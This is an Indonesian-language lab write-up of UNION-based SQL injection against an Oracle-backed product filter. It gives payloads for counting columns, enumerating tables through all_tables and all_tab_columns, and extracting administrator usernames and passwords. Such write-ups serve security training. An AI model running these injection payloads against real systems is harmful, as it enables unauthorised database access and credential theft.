# SQL injection attack, listing the database contents on Oracle

<img width="1184" height="740" alt="image" src="https://github.com/user-attachments/assets/67bba773-a502-40aa-842a-0e5f496f6d17" />

Aplikasi web ini rentan terhadap serangan SQL Injection berbasis UNION pada filter kategori produk. Backend aplikasi menggunakan database Oracle, yang memungkinkan penyerang untuk mengeksploitasi sintaks SQL spesifik Oracle untuk melakukan enumerasi dan ekstraksi data sensitif. Berbeda dari database lain, serangan ini memanfaatkan data dictionary views bawaan Oracle (seperti all_tables dan all_tab_columns) sebagai pengganti information_schema untuk memetakan struktur database dan akhirnya mencuri kredensial pengguna.

- Tujuan: dapatkan kredensial administrator dan login.
- Konteks: SQL injection berbasis UNION pada filter kategori produk.
- Database: Oracle. Ini adalah poin paling penting. Oracle tidak memiliki skema information_schema. Sebagai gantinya, ia menggunakan data dictionary views bawaan untuk menyimpan metadata.
- Petunjuk Kunci & Sintaks dari Solusi:
  - Setiap SELECT di Oracle harus memiliki klausa FROM. Untuk query yang tidak mengambil data dari tabel nyata, kita menggunakan FROM dual.
  - Untuk mendapatkan daftar tabel, kita akan melakukan query ke view all_tables.
  - Untuk mendapatkan daftar kolom, kita akan melakukan query ke view all_tab_columns.
  - Komentar yang digunakan adalah --.

# Langkah langkah pengerjaan

Langkah 1 & 2: Menentukan Jumlah dan Tipe Data Kolom
- Menentukan Jumlah Kolom: Gunakan payload ' ORDER BY n-- untuk menemukan jumlah kolom.
  - payload ' ORDER BY 2-- -> Berhasil.
  - url :
    ```
    .../filter?category=' ORDER BY 2--
    ```

<img width="1532" height="578" alt="image" src="https://github.com/user-attachments/assets/89bbea6e-beec-4a6d-80d8-67a056308846" />


  - payload ' ORDER BY 3-- -> Error.
  - url :
     ```
    .../filter?category=' ORDER BY 3--
    ```

<img width="1438" height="363" alt="image" src="https://github.com/user-attachments/assets/ac9b661f-f02b-409b-8f3a-a2dfdbe2be4f" />

Kesimpulan: Ada 2 kolom.

- Menentukan Tipe Data: Gunakan payload ' UNION SELECT 'a','b' FROM dual--.
- url :
     ```
    .../filter?category=' UNION SELECT 'a','b' FROM dual--
    ```

<img width="1313" height="518" alt="image" src="https://github.com/user-attachments/assets/acb0f156-7ac1-471e-82b3-a78a41285b15" />


- Perhatikan penggunaan FROM dual yang wajib di Oracle.
- Jika string 'a' dan 'b' muncul, ini mengonfirmasi kedua kolom dapat menampung data teks.

Langkah 3: Mendapatkan Daftar Semua Tabel

tidak bisa menggunakan information_schema.tables harus menggunakan view Oracle.

- Payload: ' UNION SELECT table_name, NULL FROM all_tables--
- url :
    ```
    .../filter?category=' UNION SELECT table_name, NULL FROM all_tables--
    ```
- Penjelasan:
  - all_tables: Ini adalah data dictionary view di Oracle yang berisi informasi tentang semua tabel yang dapat diakses oleh pengguna saat ini.
  - table_name: Ini adalah nama kolom di dalam all_tables yang berisi nama tabel.
- Hasil: Halaman akan menampilkan daftar nama tabel. Cari nama yang relevan seperti USERS, ACCOUNTS, atau sesuatu yang diacak . 

<img width="1410" height="837" alt="image" src="https://github.com/user-attachments/assets/223dea7b-6a98-441a-a632-9626fc9940e9" />

Langkah 4 & 5: Menemukan Nama Kolom Kredensial

- Payload: ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_MLQCGJ'--
- url :
  ```
    .../filter?category=' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_MLQCGJ'--
  ```
- Penjelasan:
  - all_tab_columns: Ini adalah view Oracle yang berisi informasi tentang kolom di semua tabel.
  - WHERE table_name = 'USERS_MLQCGJ': Kita memfilter hasilnya untuk hanya melihat kolom dari tabel yang kita temukan. 
- Hasil: akan mendapatkan daftar kolom untuk tabel tersebut. Cari nama seperti USERNAME, PASSWORD, atau yang diacak.

<img width="1447" height="434" alt="image" src="https://github.com/user-attachments/assets/725fe1f3-041b-44db-af07-cda9a9426f83" />

Langkah 6 & 7: Mengekstrak Username dan Password

Kita sekarang memiliki semua informasi:
- Nama Tabel: USERS_MLQCGJ
- Nama Kolom Username: USERNAME_VVZZUC
- Nama Kolom Password: PASSWORD_BOPMJC
- Payload: ' UNION SELECT USERNAME_VVZZUC, PASSWORD_BOPMJC FROM USERS_MLQCGJ--
- url :
  ```
    .../filter?category=' UNION SELECT USERNAME_VVZZUC, PASSWORD_BOPMJC FROM USERS_MLQCGJ--
  ```
- Penjelasan: Ini adalah query standar untuk mengambil data dari dua kolom di dalam tabel yang telah kita identifikasi.
- Hasil: Halaman akan menampilkan daftar lengkap username dan password.

<img width="1488" height="718" alt="image" src="https://github.com/user-attachments/assets/5dd4e8da-2ac0-4a9f-b53a-8f4618a8cd28" />

Langkah 8: Login Sebagai Administrator
- Temukan username administrator dalam daftar yang diekstrak.
- Salin password yang terkait.
- Navigasikan ke halaman login, masukkan kredensial, dan selesaikan lab.

<img width="996" height="414" alt="image" src="https://github.com/user-attachments/assets/74437bc4-87bf-4a63-955e-636e5c03914c" />

<img width="1502" height="296" alt="image" src="https://github.com/user-attachments/assets/4eaba0b3-7355-486b-b40e-1bfb9290277f" />

## Dampak
Kerentanan ini memiliki dampak yang sangat parah, yang mengarah pada Pelanggaran Data Total (Total Data Breach). Penyerang dapat membaca informasi sensitif dari database, termasuk kredensial pengguna, yang secara langsung memungkinkan pengambilalihan akun secara massal. 
